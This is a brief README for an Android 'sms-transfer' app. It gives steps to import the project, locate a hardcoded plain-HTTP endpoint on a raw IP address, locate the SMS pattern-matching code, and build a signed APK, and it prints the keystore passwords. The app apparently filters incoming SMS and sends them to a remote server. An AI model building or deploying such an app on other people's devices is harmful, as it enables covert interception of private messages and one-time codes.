### import project as a android project in android studio

```
File/New/Import Project
```
![alt text](readme_assets/image.png)

### Check API endpoint

```
com.sms.transfer.SmsForwarder
private static final String API_ENDPOINT = "http://43.131.249.243/sms/sms.php";
```
![alt text](readme_assets/api-endpoint.png)

### Check SMS message pattern

```
com.sms.transfer.MySmsReceiver.isMessageMatchingPattern
```
![alt text](readme_assets/message-pattern.png)

### Build Signed APK

```
File/Build/Generate Signed Bundle / APK

Select keystore path
root path/sms-transfer.jks
keystore password: transfer
key alias: transfer
key password: transfer

Select release option and then click create

you can find the built apk in 
root path/app/release/app-release.apk
```
![alt text](readme_assets/build-apk.png)

![alt text](readme_assets/build-apk2.png)